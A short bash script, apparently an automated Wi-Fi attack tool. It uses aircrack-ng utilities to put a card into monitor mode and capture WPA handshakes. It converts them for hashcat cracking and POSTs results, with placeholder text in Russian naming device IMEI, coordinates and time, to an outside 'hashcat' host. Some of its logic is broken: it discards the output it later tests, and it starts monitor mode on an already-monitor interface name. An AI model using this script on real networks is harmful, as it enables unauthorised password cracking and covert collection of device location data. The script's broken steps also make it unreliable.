#!/bin/bash


main(){
	airmon-ng check kill
	airmon-ng start wlan0mon

	echo "Start airodump.."
	timeout 5 airodump-ng -w /home/kali/shakes wlan0mon < /dev/null > /dev/null   
	
	echo "Clean cap file.."
	output=`wpaclean cleanshakes.cap shakes-01.cap > /dev/null`
	if [[ "$output" == *"net"* ]]; then
		echo "Handshakes detected!!!"
		aircrack-ng -j date:imei cleanshakes.cap > /dev/null
	else
		echo "No handshakes"
	fi
	curl -X POST -H "Content-Type: application/json" -d "imei устройства, координаты, время" http://hashcat:9090
}


main 
